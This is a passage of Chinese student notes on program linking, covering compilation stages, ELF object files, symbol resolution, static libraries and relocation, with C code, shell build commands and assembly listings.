class="hljs-type">int</span> val = sum(<span class="hljs-built_in">array</span>,<span class="hljs-number">2</span>); <span class="hljs-comment">//数组元素求和</span><br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br><br><span class="hljs-comment">//sum.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> *a,<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> i, s = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>        s += a[i];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译驱动程序包括</p><ul><li>语言处理器</li><li>编译器</li><li>汇编器</li><li>链接器</li></ul><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20220421000959782.png" alt="image-20220421000959782"></p><p><code>Linux</code>下驱动程序的调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -Og -o prog main.c sum.c<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-O选项对程序进行优化编译、连接。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-g选项产生符号调试工具</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-v选项可以查看编译具体的步骤</span><br></code></pre></td></tr></table></figure><p><code>C</code>预处理器(<code>cpp</code>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">将main.c翻译成ASCII码的中间文件main.i</span><br>cpp [other arguments] man.c ./main.i<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">main.i</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;main.c&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">31 <span class="hljs-string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;/usr/include/stdc-predef.h&quot;</span> 1 3 4</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">32 <span class="hljs-string">&quot;&lt;command-line&gt;&quot;</span> 2</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;main.c&quot;</span></span><br>int sum(int *a,int n);<br>int array[2] = &#123;1,2&#125;;<br><br>int main()<br>&#123;<br> int val = sum(array,2);<br> return val;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>C</code>编译器(<code>cc1</code>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">将main.i文件翻译成一个ASCII汇编语言文件main.s</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">cc1的路径 /usr/lib/gcc/x86_64-linux-gnu/9/cc1</span><br>cc1 ./main.i -Og [other arguments] -o ./main.s<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">汇编代码</span><br>.file&quot;main.i&quot;<br>.text<br>.globlmain<br>.typemain, @function<br>main:<br>.LFB0:<br>.cfi_startproc<br>subq$8, %rsp<br>.cfi_def_cfa_offset 16<br>movl$2, %esi<br>leaqarray(%rip), %rdi<br>callsum@PLT<br>addq$8, %rsp<br>.cfi_def_cfa_offset 8<br>ret<br>.cfi_endproc<br>.LFE0:<br>.sizemain, .-main<br>.globlarray<br>.data<br>.align 8<br>.typearray, @object<br>.sizearray, 8<br>array:<br>.long1<br>.long2<br>.ident&quot;GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0&quot;<br>.section.note.GNU-stack,&quot;&quot;,@progbits<br></code></pre></td></tr></table></figure><p><code>C</code>汇编器(<code>as</code>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">汇编器将汇编代码文件翻译成可重定位目标文件</span><br>as [other arguments] -o ./main.o ./main.s<br></code></pre></td></tr></table></figure><p>链接器程序(<code>ld</code>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">链接器将可重定位的目标文件及系统目标文件组合起来，输出一个可执行目标文件</span><br>ld -o prog [system object files and args] ./main.o ./sum.o<br></code></pre></td></tr></table></figure><p>加载器[<code>loader</code>]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">shell调用操作系统中加载器的函数，将可执行文件prog中的代码和数据复制到内存，然后将控制转移到这个程序的起始位置</span><br>./prog<br></code></pre></td></tr></table></figure><h2 id="7-2-静态链接"><a href="#7-2-静态链接" class="headerlink" title="7.2 静态链接"></a>7.2 静态链接</h2><p>静态链接器（<code>Linix LD</code>）</p><ul><li>输入：可重定位目标文件与命令行参数</li><li>输出：完全链接、可以加载和运行的可执行目标文件</li></ul><p>链接器的两个主要任务</p><ul><li>符号解析：目标文件定义和引用符号，每个符号对应一个函数、一个全局变量或一个静态变量。符号解析的目的是将符号引用与符号定义关联起来。</li><li>重定位：编译器和汇编器生成从地址为0开始的代码和数据节。链接器通过把每个符号定义与一个内存位置关联起来，重定位这些节，然后修改对符号的引用，使得它们指向相应的内存位置。</li></ul><h2 id="7-3-目标文件"><a href="#7-3-目标文件" class="headerlink" title="7.3 目标文件"></a>7.3 目标文件</h2><p>目标文件的三种形式</p><ul><li>可重定位目标文件：包含二进制代码和数据，其形式可以在编译时与其他可重定位目标文件合并起来，创建一个可执行目标文件。</li><li>可执行目标文件：包含二进制代码和数据，其形式可以被直接复制到内存并指向。</li><li>共享目标文件：特殊的可重定位目标文件，可以在加载或者运行时被动态地加载进内存并链接</li></ul><p>目标模块是一个字节序列，目标文件则是存储在磁盘上地目标模块。目标文件在不同地操作系统上的文件格式各不相同</p><ul><li><code>Unix</code>系统：<code>a.out</code></li><li><code>Windows</code>系统：<code>PE</code></li><li><code>MacOS-X</code>系统：<code>Mach-O</code></li><li><code>Linux</code>系统：<code>ELF</code></li></ul><h2 id="7-4-可重定位目标文件"><a href="#7-4-可重定位目标文件" class="headerlink" title="7.4 可重定位目标文件"></a>7.4 可重定位目标文件</h2><p><code>ELF HEADER</code></p><ol><li>以16字节序列开始，记载生成该文件的系统的字的大小和字节顺序。</li><li><code>ELF</code>头的大小</li><li>目标文件的类型</li><li>机器类型</li><li>节部表的文件偏移</li><li>节头部表中条目的大小和数量</li></ol><p>在<code>ELF</code>文件与节头部表之间的都是节</p><ul><li><code>.text</code>：已编译程序的机器代码</li><li><code>.rodata</code>：只读数据</li><li><code>.data</code>：已初始化的全局和静态<code>C</code>变量</li><li><code>.bss</code>：未初始化的全局和静态<code>C</code>变量，以及所有初始化为0的全局或静态变量</li><li><code>.symtab</code>：符号表，存放在程序中定义和引用的函数和全局变量的信息</li><li><code>.rel.text</code>：<code>.text</code>节中位置的列表，当链接器把该目标文件和其他文件组合时需要修改的位置。</li><li><code>.rel.data</code>：被模块引用或定义的所有全局变量的重定位信息。</li><li><code>.debug</code>：调试符号表，其条目是程序中定义的局部变量和类型定义，程序中定义和引用的全局变量，以及原始的<code>C</code>源文件。</li><li><code>.line</code>：原始<code>C</code>源程序中的行号和<code>.text</code>节中机器指令之间的映射。</li><li><code>.strtab</code>：字符串表，内容包括<code>.symtab</code>和<code>.debug</code>节中的符号表，以及节头部中的节名字。</li></ul><h2 id="7-5-符号和符号表"><a href="#7-5-符号和符号表" class="headerlink" title="7.5 符号和符号表"></a>7.5 符号和符号表</h2><p>可重定位目标模块<code>m</code>都有一个符号表，包含<code>m</code>定义和引用的符号的信息。在链接器的上下文中，有三种不同的符号：</p><ul><li>由<strong>模块<code>m</code>定义</strong>并能被其他模块引用的<strong>全局符号</strong>。全局链接器符号对应于<strong>非静态的<code>C</code>函数</strong>和<strong>全局变量</strong>。（函数与全局变量）</li><li>由<strong>其他模块定义</strong>并被模块<code>m</code>引用的全局符号。这些符号称为<strong>外部符号</strong>，对应于在<strong>其他模块</strong>中定义的<strong>非静态<code>C</code>函数</strong>和<strong>全局变量</strong>。（其他文件定义的函数和全局变量）</li><li>只被模块<code>m</code>定义和引用的<strong>局部符号</strong>。它们对应于带<strong>static</strong>属性的<strong>C函数</strong>和<strong>全局变量</strong>。这些符号只有在<strong>模块m中可见</strong>，其他模块不可引用。</li></ul><p><strong>本地程序变量</strong>指的是局部变量，存储在堆栈中而不是段中。程序只有应用时才会分配地址空间。</p><p><strong>本地链接器符号</strong>指的是存储在段地址上的变量。程序编译链接时以及分配好地址空间。</p><p><code>C</code>语言中用<code>static</code>修饰的变量类似<code>C++</code>与<code>Java</code>中使用<code>private</code>修饰变量，是当前模块私有的。</p><p>符号表数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> sturct&#123;<br><span class="hljs-type">int</span> name; <span class="hljs-comment">//字符串表中的字节偏移</span><br>    <span class="hljs-type">char</span> type:<span class="hljs-number">4</span><span class="hljs-comment">/*类型为数据或者是函数*/</span><br>         binding:<span class="hljs-number">4</span>;<span class="hljs-comment">/*代表符号是本地的还是全局的*/</span><br>    <span class="hljs-type">char</span> reserved;<span class="hljs-comment">/*未使用*/</span><br>    <span class="hljs-type">short</span> section;<br>    <span class="hljs-type">long</span> value; <span class="hljs-comment">//符号的地址</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    对于重定位文件来说value是距定义目标的节的起始位置的偏移。</span><br><span class="hljs-comment">    对于可执行目标文件来说，该值是一个绝对运行时的地址。</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-type">long</span> size; <span class="hljs-comment">//目标的大小</span><br>&#125;Elf64_Symbol;<br></code></pre></td></tr></table></figure><p>符号表需要结合字符串表寻找符号信息。</p><p>三个特殊的伪节，它们在节头部表中是没有条目的</p><ul><li><code>ABS</code>符号代表不该被重定位的符号</li><li><code>UNDEF</code>符号代表未定义的符号，本目标模块引用了，但是符号是在其他模块定义的符号</li><li><code>COMMON</code>符号表示还未被分配位置的未初始化的数据。<ul><li><code>value</code>字段给出对齐要求</li><li><code>size</code>给出最小的大小</li></ul></li><li>只有可重定位目标文件中才有这些伪节</li></ul><p><code>COMMON</code>和<code>.bss</code>的区别：<code>COMMON</code>存储未初始化的<strong>全局变量</strong>，<code>.bss</code>存储<strong>未初始化的静态变量</strong>，以及<strong>初始化为0的全局</strong>或<strong>静态变量</strong></p><p><img src="https://s2.loli.net/2022/05/08/FQpjJStIuHOxZi5.png" alt="image-20220508172957864"></p><ul><li><code>Name</code>：指的是符号的字符串</li><li><code>Value</code>：指的是符号距离节头的偏移</li><li><code>Size</code>：所占内存大小</li><li><code>Type</code>：类型，指的是函数，变量还是文件等</li><li><code>Bind</code>：指的是全局变量还是局部变量</li><li><code>Ndx</code>：指的所在节区</li></ul><p><strong>练习题7.1</strong></p><table><thead><tr><th>符号</th><th>.symtab条目?</th><th>符号类型</th><th>在哪个模块中定义</th><th>节</th></tr></thead><tbody><tr><td>buf</td><td>是</td><td>外部</td><td>m.o</td><td>.data</td></tr><tr><td>bufp</td><td>是</td><td>全局</td><td>swap.o</td><td>.data</td></tr><tr><td>bufp1</td><td>是</td><td>全局</td><td>swap.o</td><td>COMMON</td></tr><tr><td>swap</td><td>是</td><td>全局</td><td>swap.o</td><td>.text</td></tr><tr><td>temp</td><td>否</td><td></td><td></td><td></td></tr></tbody></table><h2 id="7-6-符号解析"><a href="#7-6-符号解析" class="headerlink" title="7.6 符号解析"></a>7.6 符号解析</h2><p><strong>链接器如何解析多重定义的全局符号</strong></p><p><strong>函数</strong>与<strong>已初始化的全局变量</strong>是强符号</p><p><strong>未初始化的全局变量</strong>是弱符号</p><ul><li>规则1：不允许多个同名的强符号</li><li>规则2：如果有一个强符号和多个弱符号同名，那么选择强符号（有强选强）</li><li>规则3：如果有多个弱符号同名，那么则随机从弱符号中选择一个（多弱随机）</li></ul><p><strong>练习题7.2</strong></p><p>A</p><p>(a)REF(main.1) -&gt; DEF(main.1)</p><p>(b)REF(main.2)-&gt;DEF(main.1)</p><p>B</p><p>(a)两个强符号，错误</p><p>(b)两个强符号，错误</p><p>C</p><p>(a)REF(x.1)-&gt;DEF(x.2)</p><p>(b)REF(x.2)-&gt;DEF(x.2)</p><p>  <strong>与静态库链接</strong></p><p>当链接器接收的是一组可重定位目标文件</p><p>将相关的目标模块打包成为一个单独的文件，称之为静态库作为链接器的输入。</p><p><img src="https://s2.loli.net/2022/05/08/ZpA6qQOlx3NR4dJ.png" alt="image-20220508233013659"></p><p>当链接器输出可执行文件时，它仅仅复制静态库里被应用程序引用的目标模块。</p><p>当不适用静态库时，编译器开发者向用户提供库函数的几种做法：</p><ul><li><p>方法一：使用编译器识别库函数，生成指定库函数代码。</p><ul><li>缺点：C标准定义了大量的标准函数，给编译器增加了复杂性，并且库函数每次更新都需要更新一次编译器。</li></ul></li><li><p>方法二：将所有标准C函数都放在单独的可重定位目标模块中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc main.c /usr/lib/libc.o<br></code></pre></td></tr></table></figure><ul><li>优点：将编译器与库函数的实现分离开</li><li>缺点：每个可执行文件都需要包含一份标准函数副本，以及每个运行的程序都需要将这些函数副本放置在内存中。每次库函数更新都需要重新编译重定位模块</li></ul></li><li><p>方法三：可以将每个库函数单独编译成独立的重定位模块，但是每次连接时需要将多个重定位模块进行链接，容易出错且耗时</p></li></ul><p>静态库结合了方法二与方法三，将方法相近的模块编译为独立的目标模块，然后封装为一个单独的静态库文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc main.c /usr/lib/libm,a /usr/lib/libc.a<br></code></pre></td></tr></table></figure><p>在链接时，链接器只复制被程序引用的目标模块。</p><p>在<code>Linux</code>系统中，静态库以一种成为存档的特殊文件格式存放在磁盘中。存档文件命后缀<code>.a</code></p><p><strong>addvec.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> addcnt = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">addvec</span><span class="hljs-params">(<span class="hljs-type">int</span> *x,<span class="hljs-type">int</span> *y,<span class="hljs-type">int</span> *z,<span class="hljs-type">int</span> n)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><br>addcnt++;<br><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>z[i] = x[i] + y[i];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>multvec.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> multcnt = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">multvec</span><span class="hljs-params">(<span class="hljs-type">int</span> *x,<span class="hljs-type">int</span> *y, <span class="hljs-type">int</span> *z,<span class="hljs-type">int</span> n)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><br>multcnt++;<br><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>z[i] = x[i] * y[i];<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -c addvec.c multvec.c<br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成静态库</span><br>ar rcs libvector.a addvec.o multvec.o<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">与静态库链接</span><br>gcc -static -o prog2c main2.o ./libvector.a<br><span class="hljs-meta prompt_">#</span><span class="language-bash">等价于</span><br>gcc -static -o prog2c main2.o -L . -lvector<br></code></pre></td></tr></table></figure><p><strong>链接器解析静态库引用</strong></p><p>链接器<strong>从左到右</strong>按照编译器驱动程序命令扫描<strong>可重定位目标文件</strong>和<strong>存档文件</strong></p><p>链接器维护三个集合，初始时，三个集合都为空</p><ul><li><strong>可重定位目标文件</strong>的集合E</li><li>一个<strong>未解析</strong>的符号集合U</li><li>在前面输入文件中<strong>已定义</strong>的符号集合D</li></ul><p><strong>链接器解析引用</strong></p><ul><li>对每个输入文件<code>f</code>，链接器会判断<code>f</code>是目标文件还是存档文件。如果<code>f</code>是目标文件，那么链接器将<code>f</code>添加到<code>E</code>，<code>U</code>是用来放置引用了但是没有找到定义的符号，<code>D</code>则是已经在模块中定义的符号，因此若输入文件中存在集合<code>U</code>中定义的符号，则将集合<code>U</code>中的符号放置在集合<code>D</code>中</li><li>如果<code>f</code>是存档文件，链接器就会将集合<code>U</code>中的符号与存档文件定义的符号进行比较。若存档文件中的成员<code>m</code>定义了集合<code>U</code>中的符号，则将成员<code>m</code>放置到集合<code>E</code>中，将集合<code>U</code>中的符号移动到集合<code>D</code>中，对存档文件的每个成员都依次进行该过程，直到<code>U</code>和<code>D</code>都不发生变化。那么不包含在集合<code>E</code>中的成员目标文件都会被抛弃，链接器则继续输入下一个文件。</li><li>若链接器完成了所有输入文件的解析，但是发现集合<code>U</code>非空，那么就会发出异常并终止。否则就合并和重定位<code>E</code>中的目标文件，构建输出的可执行文件。</li></ul><p><strong>练习题7.3</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">A.p.o -&gt; libx.a</span><br>gcc p.o libx.a<br><span class="hljs-meta prompt_">#</span><span class="language-bash">B.p.o -&gt; libx.a -&gt; liby.a</span><br>gcc p.o libx.a liby.a<br><span class="hljs-meta prompt_">#</span><span class="language-bash">C.p.o -&gt; libx.a -&gt; liby.a且liby.a-&gt;libx.a-&gt;p.o</span><br>gcc p.o libx.a liby.a libx.a <br></code></pre></td></tr></table></figure><h2 id="7-7-重定位"><a href="#7-7-重定位" class="headerlink" title="7.7 重定位"></a>7.7 重定位</h2><p>重定位由两个步骤组成</p><ul><li>重定位节和符号定义：链接器将所有相同类型的节合并为同一类型的新的聚合节。接着链接器将运行时内存地址赋给新的聚合节，赋给输入模块定义的每个节以及赋给输入模块定义的每个符号。此时，程序中的每条指令和全局变量都有唯一的运行时内存地址。（往符号写入地址）</li><li>重定位节中的符号引用：链接器修改代码节和数据节中对符号的引用，使得它们指向正确的运行时地址。（将符号的地址重定位），重定位依赖于可重定位目标模块中称为<strong>重定位条目的数据结构</strong></li></ul><p><strong>重定位条目</strong></p><p>当编译器遇到最终未知的目标引用时，它会生成一个重定位条目，用于告知链接器在目标文件合并为可执行文件时如何修改这个引用。</p><p>代码的重定位条目放在<code>.rel.text</code>中</p><p>初始化数据的重定位条目放在<code>.rel.data</code>中</p><p><code>ELF</code>重定位条目的数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">long</span> offset; <span class="hljs-comment">//标识需要被修改的引用的节偏移</span><br>    <span class="hljs-type">long</span> type:<span class="hljs-number">32</span>, <span class="hljs-comment">//用于告知链接器如何修改新的引用</span><br>    symbol:<span class="hljs-number">32</span>; <span class="hljs-comment">//标识被修改引用应该指向的符号</span><br>    <span class="hljs-type">long</span> addend; <span class="hljs-comment">//有些重定位类型需要它作为偏移调整</span><br>&#125;Elf64_Rela;<br></code></pre></td></tr></table></figure><p>两种最基本的重定位类型</p><ul><li><code>R_X86_64_PC32</code>：重定位一个使用32位<code>PC</code>相对地址的引用</li><li><code>R_X86_64_32</code>：重定位一个使用32位绝对地址的引用</li></ul><p><strong>重定位符号引用</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">foreach section s&#123; <span class="hljs-comment">//遍历每个节</span><br>    foreach relocation entry r&#123; <span class="hljs-comment">//遍历每个重定位结构条目</span><br>        refptr = s + r.offset; <span class="hljs-comment">//节地址+节偏移地址 = 重定位条目的地址</span><br>        <span class="hljs-keyword">if</span>(r.type == R_X86_64_PC32)&#123; <span class="hljs-comment">//使用PC相对地址引用</span><br>            refaddr = ADDR(s) + r.offset;<br>            *refptr = (<span class="hljs-type">unsigned</span>)(ADDR(r.symbol) + r.addend - refaddr);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(r.type == R_X86_64_32) <span class="hljs-comment">//使用绝对地址</span><br>            *refptr = (<span class="hljs-type">unsigned</span>)(ADDR(r.symbol) + r.addend);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>main.o</code>反汇编代码</p><p><code>main</code>函数中有两个重定位引用，并且汇编器为每个引用产生一个重定位条目，显示在该引用的后面。<code>array</code>使用<code>PC</code>相对地址进行重定位，而<code>sum</code>使用绝对地址引用</p><p><strong>重定位PC相对引用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">e: e8 00 00 00 00 callq 13 &lt;main+0x13&gt;<br></code></pre></td></tr></table></figure><ul><li><code>e8</code>：是<code>call</code>指令的操作码</li></ul><p>相应的重定位条目<code>r</code>由4个字段组成</p><ul><li><code>r.offset</code> &#x3D; <code>0xf</code> <ul><li><code>call</code>指令偏移<code>0xe</code>，但是<code>e8</code>后一个字节码偏移为<code>0xf</code></li></ul></li><li><code>r.symbol</code> &#x3D; <code>sum</code><ul><li>该重定位项为<code>sum</code></li></ul></li><li><code>r.type</code> &#x3D; <code>R_X86_64_PC32</code><ul><li>采用PC相对引用</li></ul></li><li><code>r.addend</code> &#x3D; <code>-4</code><ul><li>当前需要填充字节码的地址与下一条指令的距离</li></ul></li></ul><p>重定位的流程</p><ul><li><p>首先链接器确定了 节地址<code>ADDR(s)</code> &#x3D; <code>ADDR(.text)</code> &#x3D; <code>0x4004d0</code>与确定了符号地址<code>ADDR(r.symbol)</code> &#x3D; <code>ADDR(sum)</code> &#x3D; <code>0x4004e8</code></p></li><li><p>接着计算引用的运行地址$refaddr &#x3D; ADDR(s) + r.offset\&#x3D;0x4004d0+0xf\0x4004df$</p></li><li><p>然后修改该引用，使其指向函数实际运行地址$*refptr &#x3D; (unsigned)(ADDR(r.symbol)+r.addend - refaddr)\&#x3D;(unsigned)(0x4004e8 + (-4) - 0x4004df)\&#x3D;(unsigned)(0x5)$</p></li><li><p>最后，指令被修改为</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4004e8:e8 05 00 00 00 callq 4004e8&lt;sum&gt;<br></code></pre></td></tr></table></figure><ul><li>在指令执行时，CPU执行的步骤为<ul><li>将<code>PC</code>(下一条指令)压入栈中</li><li>计算地址$PC &lt;-  PC + 0x5 &#x3D; 0x4004e3(下一条指令的地址) + 0x5 &#x3D; 0x4004e8$</li></ul></li></ul><p><strong>重定位绝对引用</strong></p><p><code>array</code>的重定位条目为</p><ul><li><code>r.offset</code> &#x3D; <code>0xa</code></li><li><code>r.symbol</code> &#x3D; <code>array</code></li><li><code>r.type</code> &#x3D; <code>R_X86_64_32</code></li><li><code>r.addend</code> &#x3D; <code>0</code></li></ul><p>重定位流程</p><ul><li>首先确定符号运行地址：<code>ADDR(r.symbol) = ARRD(array) = 0x601018</code></li><li>接着链接器修改引用$*refptr &#x3D; (unsigned)(ADDR(r.symbol) + r.addend)\&#x3D; (unsigend)(0x601018+0)\(unsigned)(0x601018)$</li><li>最后可执行目标文件下的指令为</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4004d9: bf 18 10 60 00 mob $0x601018,%edi<br></code></pre></td></tr></table></figure><h2 id="7-8-可执行目标文件"><a href="#7-8-可执行目标文件" class="headerlink" title="7.8 可执行目标文件"></a>7.8 可执行目标文件</h2><p>二进制文件包含加载程序到内存并运行它所需的所有信息</p><p><img src="https://s2.loli.net/2022/05/10/L6zNOjwHhcDT1Mf.png" alt="image-20220510175440833"></p><p><strong>ELF文件格式</strong></p><ul><li><code>ELF</code>头描述文件的总体格式，包含程序的入口点</li><li><code>.init</code>节定义了个函数，叫做<code>_init</code>，程序的初始化代码会调用它。由于可执行文件是完全链接的（已被重定位），所以它不再需要<code>.rel</code>节</li></ul><p>程序头部表描述了可执行文件到连续的内存段的映射</p><p><img src="https://s2.loli.net/2022/05/10/5N1RPTUScnwVQKH.png" alt="image-20220510180231214"></p><ul><li><code>off</code>：目标文件中的偏移</li><li><code>vaddr/paddr</code>：内存地址</li><li><code>align</code>：对齐要求</li><li><code>filesz</code>：目标文件中的段大小</li><li><code>memsz</code>：内存中的段大小</li><li><code>flags</code>：运行时访问权限</li></ul><h2 id="7-9-加载可执行目标文件"><a href="#7-9-加载可执行目标文件" class="headerlink" title="7.9 加载可执行目标文件"></a>7.9 加载可执行目标文件</h2><p>执行目标文件所执行的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./prog<br></code></pre></td></tr></table></figure><p>可执行文件是通过加载器运行。<code>execve</code>函数可以用来调用加载器，加载器将可执行目标文件中的代码和数据从磁盘复制到内存中，然后通过跳转到程序的第一条指令或入口点来运行该程序。将程序复制到内存并运行的过程叫做加载。</p><p><img src="https://s2.loli.net/2022/05/10/NjDWEBIcFldSsi3.png" alt="image-20220510181119921"></p><p>在<code>Linux 